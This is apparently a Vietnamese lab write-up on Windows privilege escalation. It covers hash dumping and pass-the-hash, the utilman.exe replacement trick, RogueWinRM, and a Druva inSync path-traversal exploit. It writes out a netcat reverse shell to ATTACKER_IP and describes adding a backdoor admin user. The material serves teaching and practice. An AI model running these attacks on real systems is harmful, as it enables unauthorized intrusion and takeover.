<img width="468" height="89" alt="image" src="https://github.com/user-attachments/assets/29d4588f-9073-43ae-af94-532cea5ec1ee" />

Dùng impacket để truy suất password hashes của người dùng: 

<img width="468" height="111" alt="image" src="https://github.com/user-attachments/assets/49d9eaff-128b-4e28-82a5-cf14b55576b1" />

Cuối cùng, chúng ta có thể dùng hash của Administrator để thực hiện 1 cuộc tấn công Pass-the-Hash và giành quyền truy cập đến máy đích với đặc quyền của SYSTEM:

<img width="468" height="231" alt="image" src="https://github.com/user-attachments/assets/28d50d37-f277-46bb-b63c-99d42616c357" />

## **SeTakeOwnership**

Đặc quyền SeTakeOwnership cho phép người dùng nắm quyền sở hữu bất kỳ đối tượng nào trên hệ thống, bao gồm tệp tin và registry keys, mở ra nhiều cơ hội để kẻ tấn công leo thang đặc quyền. Ví dụ, tìm kiếm 1 dịch vụ do SYSTEM chạy và làm chủ tệp thực thi của dịch vụ.

Để có được đặc quyền SeTakeOwnership, bạn phải chạy command prompt với tư cách là quản trị viên.

Kiểm tra đặc quyền:

<img width="441" height="163" alt="image" src="https://github.com/user-attachments/assets/2a50a9d0-cfe9-4066-8982-eaca7e87b4ee" />

Lần này chúng ta sẽ lạm dụng utilman.exe để leo thang đặc quyền. Utilman là 1 ứng dụng được dựng sẵn trong Windows cung cấp tùy chọn Ease of Access trong quá trình khóa màn hình:

<img width="368" height="316" alt="image" src="https://github.com/user-attachments/assets/dbc43c81-e0fe-4bae-b682-7d64f65730f2" />

Vì Utilman chạy với đặc quyền của hệ thống, chúng ta sẽ giành được đặc quyền của hệ thống nếu thay thế tệp nhị phân gốc với payload mà ta thích. Vì ta có thể làm chủ bất cứ tệp tin nào thì thay thế là chuyện tầm thường.

Để thay thế utilman, chúng ta sẽ làm chủ nó với lệnh sau:

<img width="468" height="113" alt="image" src="https://github.com/user-attachments/assets/e80b3286-b78b-4081-aabf-660a7e58a58b" />

**Lưu ý:** việc làm chủ 1 tập tin không đồng nghĩa với việc bạn đã có các đặc quyền trên nó, nhưng làm chủ bạn có thể gán cho mình các đặc quyền mình muốn. Để cấp cho người dùng toàn quyền qua util.exe, dùng lệnh sau: 

<img width="468" height="94" alt="image" src="https://github.com/user-attachments/assets/1784a462-0f4e-4b14-88d5-94e22332f677" />

Sau đó, chúng ta sẽ thay thế utilman.exe bằng cách sao chép cmd.exe:

<img width="468" height="84" alt="image" src="https://github.com/user-attachments/assets/d36fb2c0-b1ea-490b-bd36-a0ce338dacfe" />

Để thực thi utilman, chúng ta sẽ khóa màn hình từ nút start:

<img width="193" height="293" alt="image" src="https://github.com/user-attachments/assets/3095dd72-f852-4642-9887-b27dd14a6faf" />

Tiếp tục chọn nút “Ease of Access”, chạy utilman.exe với đặc quyền của hệ thống. Vì chúng ta đã thay thế nó bằng 1 bản sao chép của cmd.exe, chúng ta sẽ có 1 command prompt với đặc quyền của hệ thống: 

<img width="392" height="243" alt="image" src="https://github.com/user-attachments/assets/da8a717d-64da-46e8-beb1-2c15ed4e2449" />

## **SeImpersonate/SeAssignPrimaryToken**

Đặc quyền này cho phép 1 tiến trình mạo danh 1 người dùng khác và hoạt động thay họ. Việc mạo danh thường bao gồm khả năng tạo ra 1 tiến trình hoặc luồng trong bối cảnh bảo mật của người dùng khác.

Việc mạo danh rất dễ hiểu khi bạn nghĩ về cách 1 máy chủ FTP hoạt động. Máy chủ FTP giới hạn người dùng chỉ được truy cập các tập tin mà họ được phép.

Giả sử chúng ta có 1 dịch vụ FTP chạy với người dùng ftp. Không có mạo danh, nếu người dùng Ann đăng nhập máy chủ FTP và cố gắng truy cập các tập tin của cô ấy, dịch vụ FTP sẽ truy cập chúng bằng access token của chính nó thay vì của Ann.

<img width="468" height="185" alt="image" src="https://github.com/user-attachments/assets/c998955b-741f-4816-817d-958e82d7e7ba" />

Có một vài lí do mà dùng token của ftp không phải là ý tưởng tốt:

* Đối với các tập tin được phục vụ 1 cách chính xác, chúng cần có sự truy cập của người dùng fpt. Trong ví dụ trên, dịch vụ FTP có thể truy cập các tập tin của Ann nhưng không phải của Bill vì DACL trong các tập tin của Bill không cho phép người dùng ftp. Điều này làm tăng thêm sự phức tạp vì chúng ta phải cấu hình các đặc quyền cụ thể cho từng tập tin/thư mục.
    
* Đối với hệ điều hành, tất cả tập tin có thể truy cập bởi người dùng ftp, không phụ thuộc vào việc người dùng nào hiện đang đăng nhập vào dịch vụ FTP. Điều này khiến cho việc ủy quyền cho hệ điều hành không thể thực hiện được. Do đó, dịch vụ bắt buộc phải thực thi nó.
    
* Nếu dịch vụ FTP bị thâm nhập, kẻ tấn công sẽ giành quyền truy cập tất cả thư mục mà người dùng ftp được làm
    

Nói cách khác, người dùng của dịch vụ FTP có đặc quyền SeImpersonate hay SeAssignPrimaryToken, tất cả điều này được đơn giản hóa một chút, vì dịch vụ FTP có thể tạm thời lấy access token của người dùng đăng nhập và dùng nó để thực hiện bất cứ tác vụ nào thay mặt họ:

<img width="468" height="189" alt="image" src="https://github.com/user-attachments/assets/67af97c3-65fa-4b6e-b5fe-dc35408c0364" />

Nếu người dùng Ann đăng nhập dịch vụ FTP và người dùng ftp có đặc quyền mạo danh, nó có thể mượn access token của Ann và dùng nó để truy cập tập tin của cô ấy. Với cách này, các tập tin không cần cung cấp quyền truy cập cho người dùng ftp và hệ điều hành xử lí việc phân quyền. Vì dịch vụ FTP đang giả mạo Ann, nó không thể truy cập các tập tin của Jude hay Bill trong phiên này.

Đối với kẻ tấn công, nếu họ thành công kiểm soát được 1 tiến trình có đặc quyền SeImpersonate hay SeAssignPrimaryToken, họ có thể mạo danh bất cứ người dùng nào để kết nối và và xác thực đến tiến trình đó.

Trong hệ thống Windows, bạn sẽ thấy LOCAL SERVICE và NETWORK SERVICE ACCOUNTS cũng có đặc quyền như vậy. Vì các tài khoản để khởi động dịch vụ bị hạn chế nên cho phép chúng mạo danh người khác. Internet Information Services (IIS) cũng tạo 1 tài khoản mặc định gọi là “iis appool\\defaultappool”  cho các ứng dụng web.

Để leo thang đặc quyền bằng các tài khoản như vậy, kẻ tấn công cần:

* Khởi động 1 tiến trình mà người dùng có thể kết nối và xác thực để mạo danh
    
* Tìm 1 cách để buộc người dùng có đặc quyền kết nối và xác thực đến tiến trình độc hại đó.
    

Chúng ta sẽ dùng khai thác RogueWinRM thỏa hai điều kiện trên.

Giả sử chúng ta đã thâm nhập 1 trang web chạy trên IIS và dựng được webshell ở địa chỉ sau: http://10.10.239.245/

Chúng ta có thể dùng webshell để kiểm tra các đặc quyền của 1 tài khoản bị thâm nhập: 

<img width="468" height="200" alt="image" src="https://github.com/user-attachments/assets/05471f7b-875c-46f7-9ca0-8789a58f67dd" />

Để dùng RogueWinRM, đầu tiên chúng ta cần upload 1 khai thác đến hệ thống đích. Để cho tiện lợi, bạn có thể tìm thấy khai thác trong thư mục C:\\tools

Khai thác RogueWinRM khả thi vì khi 1 người dùng (không có đặc quyền) bắt đầu dịch vụ BITS trong Windows, nó tự động tạo 1 kết nối đến cổng 5985 bằng đặc quyền của SYSTEM. Cổng 5985 thường được dùng cho dịch vụ WinRM, là 1 cổng hiển thị Powershell console có thể dùng từ xa qua mạng.

Vì 1 lí do nào đó, dịch vụ WinRM không chạy được trên máy nạn nhân, kẻ tấn công có thể bắt đầu 1 dịch vụ WinRM giả trên cổng 5985 và bắt được thông tin xác thực được thực hiện bởi dịch vụ BITS khi bắt đầu. Nếu kẻ tấn công có đặc quyền SeImpersonate, họ có thể thực thi bất cứ lệnh nào thay cho người dùng kết nối, đó là SYSTEM.

Trước khi chạy khai thác, chúng ta sẽ bắt đầu 1 listener để nhận reverse shell trên máy của kẻ tấn công:

```javascript
nc -lnvv -p 4442
```

Và sau đó, dùng webshell để thực thi khai thác RogueWinRM:

```javascript
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442" 
```
<img width="468" height="264" alt="image" src="https://github.com/user-attachments/assets/e2e9040e-c05e-4a7c-8d6d-04d6732bb0b3" />

**Lưu ý:** khai thác có thể mất 2 phút để hoạt động, vì vậy trình duyệt của bạn có thể không phản hồi trong 1 lúc. Điều này xảy ra nếu bạn chạy khai thác nhiều lần vì nó bắt buộc phải đợi cho dịch vụ BITS dùng trước khi bắt đầu lại. Dịch vụ BITS sẽ dừng tự động sau 2 phút bắt đầu.

Tham số -p chỉ định tệp thực thi được chạy bởi khai thác, trong trường hợp này là nc64.exe. Tham số -a để truyền đối số cho tệp thực thi. Vì chúng ta muốn nc64 thiết lập 1 reverse shell đến máy của kẻ tấn công nên đối số truyền vào netcat là

```javascript
-e cmd.exe ATTACKER_IP 4442.
```

Nếu tất cả được thiết lập chính xác, bạn nên mong đợi 1 shell có đặc quyền của SYSTEM:

<img width="468" height="163" alt="image" src="https://github.com/user-attachments/assets/a13e0ee0-7583-477e-9794-5ea6530db355" />

# **Abusing vulnerable software** 

## **Unpatched Software**

Phần mềm được cài đặt trên hệ thống đích có nhiều cơ hội để leo thang đặc quyền. Đối với drivers, người dùng và tổ chức có thể không cập nhật thường xuyên như hệ điều hành. Bạn có thể dùng công cụ wmic để liệt kê các phần mềm được cài đặt trên hệ thống đích và phiên bản của nó:

```javascript
wmic product get name,version,vendor
```

Nhớ là lệnh wmic product không trả về tất cả chương trình đã cài đặt. Việc kiểm tra desktop shortcuts, dịch vụ hay bất kì dấu vết nào chỉ ra sự tồn tại của 1 phần mềm bổ sung có thể bị dính lỗ hổng rất quan trọng.

Khi thu thập thông tin về sản phẩm, chúng ta có thể tìm kiếm các khai thác có sẵn trên phần mềm ở các trang web như: exploit-db, packet storm, google,..

## **Case Study: Druva inSync 6.6.3**

Máy chủ đích đang chạy Druva inSync 6.6.3 bị dính lỗ hổng dẫn đến leo thang đặc quyền được báo cáo bởi Matteo Malvica. Lỗ hổng này xuất phát  từ 1 bản vá được áp dụng cho 1 lỗ hổng khác được thông báo ở phiên bản 6.5.0 bởi Chris Lyne.

Phần mềm bị dính lỗ hổng vì nó chạy máy chủ RPC (Remote Procedure Call) ở cổng 6064 với đặc quyền của System, chỉ có thể truy cập từ [localhost](http://localhost). Nếu bạn không quen với RPC, thì đó chỉ đơn giản là 1 cơ chế cho phép 1 tiến trình cụ thể hiển thị các chức năng (được gọi là RPC lingo) qua mạng mà các máy ảo khác có thể gọi nó từ xa.

Trong trường hợp của Druva inSync, một trong các thủ tục được hiển thị (đặc biệt là thủ tục thứ 5) trên cổng 6064 cho phép bạn gửi yêu cầu để thực thi lệnh.

Lỗ hổng ban đầu được thông báo ở phiên bản 6.5.0 và có thể thực thi lệnh mà không bị giới hạn. Ý tưởng đằng sau việc cung cấp 1 chức năng như vậy là thực thi các tệp nhị phân được cung cấp với inSync chứ không phải bất cứ lệnh nào. Tuy vậy, không có kiểm tra nào để đảm bảo điều đó.

Một bản vá đã được phát hành, họ quyết định lệnh được thực thi phải bắt đầu với chuỗi C:\\ProgramData\\Druva\\inSync4\\. Sau đó, nó đã chứng minh không đủ vì bạn có thể thực hiện 1 cuộc tấn công path traversal để bỏ qua loại kiểm soát này. Giả sử bạn muốn thực thi C:\\Windows\\System32\\cmd.exe, không nằm trong đường dẫn cho phép, bạn có thể yêu cầu máy chủ chạy C:\\ProgramData\\Druva\\inSync4\\..\\..\\..\\Windows\\System32\\cmd.exe và nó sẽ bỏ qua được bộ lọc thành công. 

Để thực hiện một cuộc khai thác thành công, chúng ta cần hiểu cách giao tiếp với cổng 6064. May mắn cho chúng ta, giao thức được sử dụng khá rõ ràng và các gói tin gửi đi được mô tả như sau:

<img width="468" height="253" alt="image" src="https://github.com/user-attachments/assets/1f0741bf-a907-4d66-a41d-cd5c136866d1" />

Gói tin đầu tiên chỉ đơn giản là 1 gói tin hello chứa 1 chuỗi cố định. Gói tin thứ hai chỉ ra chúng ta muốn thực thi procedure thứ 5 vì nó là procedure bị dính lỗ hổng command injection. Hai gói tin cuối được dùng để gửi độ dài của câu lệnh và câu lệnh được thực thi.

Khai thác có thể được dùng trong máy đích để leo thang đặc quyền và truy suất flag của bài toán. Để cho thuận tiện, đây là đoạn mã khai thác:

<img width="468" height="224" alt="image" src="https://github.com/user-attachments/assets/9ad8ea1e-0d42-4505-aa0d-361373edfd4f" />

Bạn có thể mở Powershell console và dán khai thác trực tiếp để thực thi nó. Lưu ý payload mặc định của khai thác được chỉ định trong biến $cmd sẽ tạo 1 user tên pwnd trong hệ thống, nhưng không gán cho anh ấy đặc quyền của quản trị viên, vì vậy chúng ta sẽ muốn thay đổi payload để trở nên hữu ích hơn. 

<img width="468" height="67" alt="image" src="https://github.com/user-attachments/assets/0337d6bc-622b-4d91-9a47-fc44008003da" />

Nó sẽ tạo user pwnd với mật khẩu: SimplePass123 và thêm người dùng vào nhóm administrators. Nếu khai thác thành công, bạn có thể chạy lệnh sau để kiểm tra người dùng pwnd  có tồn tại và là 1 phần trong nhóm administrators:

<img width="404" height="159" alt="image" src="https://github.com/user-attachments/assets/3dd288da-ca20-4d90-8b1c-2b124f5c4a7a" />

Cuối cùng bạn chạy command prompt với đặc quyền của quản trị viên:

<img width="224" height="208" alt="image" src="https://github.com/user-attachments/assets/e888f2d0-1506-4103-8605-2886f2027f50" />

Khi được hỏi về thông tin đăng nhập, dùng tài khoản pwnd. Bạn có thể truy suất flag từ desktop của quản trị viên.
